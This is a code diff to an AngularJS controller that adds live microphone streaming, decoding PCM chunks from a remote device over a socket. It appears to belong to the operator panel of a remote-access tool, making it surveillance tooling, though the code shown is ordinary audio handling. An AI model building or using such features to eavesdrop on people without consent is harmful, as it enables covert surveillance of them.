@@ -579,32 +579,152 @@ app.controller("SimCtrl", function ($scope, $rootScope) {
 
 //-----------------------Mic Controller (mic.htm)------------------------
 // Mic controller
-app.controller("MicCtrl", function ($scope, $rootScope) {
+app.controller("MicCtrl", function ($scope, $rootScope, $timeout) {
     $MicCtrl = $scope;
     $MicCtrl.isAudio = true;
+    $MicCtrl.isStreaming = false;
     var mic = CONSTANTS.orders.mic;
+    var audioContext = null;
+    var scriptProcessor = null;
+    var audioQueue = [];
+    var isPlaying = false;
+    var sampleRate = 44100;
 
     $MicCtrl.$on('$destroy', function () {
         // release resources, cancel Listner...
         socket.removeAllListeners(mic);
+        if ($MicCtrl.isStreaming) {
+            $MicCtrl.StopStream();
+        }
+        if (audioContext) {
+            audioContext.close();
+        }
     });
 
     $MicCtrl.Record = (seconds) => {
-
         if (seconds) {
             if (seconds > 0) {
                 $rootScope.Log('Recording ' + seconds + "'s...");
                 socket.emit(ORDER, { order: mic, sec: seconds });
             } else
                 $rootScope.Log('Seconds must be more than 0');
-
         }
-
     }
 
+    $MicCtrl.StartStream = () => {
+        if ($MicCtrl.isStreaming) {
+            $rootScope.Log('Stream already started', CONSTANTS.logStatus.WARNING);
+            return;
+        }
+        
+        $MicCtrl.isStreaming = true;
+        $MicCtrl.isAudio = false;
+        audioQueue = [];
+        isPlaying = false;
+        
+        // Initialize Web Audio API for real-time PCM playback
+        try {
+            audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            sampleRate = audioContext.sampleRate;
+            
+            // Create script processor for real-time audio playback
+            scriptProcessor = audioContext.createScriptProcessor(4096, 0, 1);
+            scriptProcessor.onaudioprocess = function(e) {
+                var output = e.outputBuffer.getChannelData(0);
+                var queueLength = audioQueue.length;
+                
+                if (queueLength > 0) {
+                    var chunk = audioQueue.shift();
+                    var chunkLength = Math.min(chunk.length / 2, output.length); // PCM16 = 2 bytes per sample
+                    
+                    for (var i = 0; i < chunkLength; i++) {
+                        var sample = (chunk[i * 2 + 1] << 8) | (chunk[i * 2] & 0xFF);
+                        if (sample > 32767) sample -= 65536;
+                        output[i] = sample / 32768.0;
+                    }
+                    
+                    // Fill rest with zeros
+                    for (var i = chunkLength; i < output.length; i++) {
+                        output[i] = 0;
+                    }
+                } else {
+                    // No data, output silence
+                    for (var i = 0; i < output.length; i++) {
+                        output[i] = 0;
+                    }
+                }
+            };
+            
+            scriptProcessor.connect(audioContext.destination);
+            isPlaying = true;
+            
+            $rootScope.Log('Starting real-time audio stream...', CONSTANTS.logStatus.INFO);
+        } catch (e) {
+            console.error('Error initializing Web Audio API:', e);
+            $rootScope.Log('Web Audio API error: ' + e.message, CONSTANTS.logStatus.FAIL);
+            $MicCtrl.isStreaming = false;
+            return;
+        }
+        
+        socket.emit(ORDER, { order: mic, extra: 'start' });
+        $MicCtrl.$apply();
+    }
+
+    $MicCtrl.StopStream = () => {
+        if (!$MicCtrl.isStreaming) {
+            return;
+        }
+        
+        $MicCtrl.isStreaming = false;
+        $rootScope.Log('Stopping audio stream...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: mic, extra: 'stop' });
+        
+        if (scriptProcessor) {
+            scriptProcessor.disconnect();
+            scriptProcessor = null;
+        }
+        
+        audioQueue = [];
+        isPlaying = false;
+        
+        $timeout(function() {
+            if (!$MicCtrl.$$phase && !$MicCtrl.$root.$$phase) {
+                $MicCtrl.$apply();
+            }
+        }, 0);
+    }
 
     socket.on(mic, (data) => {
-        if (data.file == true) {
+        if (data.pcm == true) {
+            // PCM streaming chunk received
+            if (!$MicCtrl.isStreaming) {
+                return; // Ignore chunks if not streaming
+            }
+            
+            try {
+                var uint8Arr = new Uint8Array(data.buffer);
+                var receivedSampleRate = data.sampleRate || 44100;
+                
+                // Adjust sample rate if needed (simple resampling not implemented, just use as-is)
+                if (receivedSampleRate !== sampleRate) {
+                    sampleRate = receivedSampleRate;
+                    $rootScope.Log('Sample rate: ' + sampleRate + ' Hz', CONSTANTS.logStatus.INFO);
+                }
+                
+                // Add to audio queue for playback
+                audioQueue.push(uint8Arr);
+                
+                // Limit queue size to prevent memory issues
+                if (audioQueue.length > 10) {
+                    audioQueue.shift(); // Remove oldest chunk
+                }
+                
+            } catch (e) {
+                console.error('Error processing PCM chunk:', e);
+                $rootScope.Log('Error processing PCM chunk: ' + e.message, CONSTANTS.logStatus.FAIL);
+            }
+            
+        } else if (data.file == true) {
             $rootScope.Log('Audio arrived', CONSTANTS.logStatus.SUCCESS);
 
             var player = document.getElementById('player');
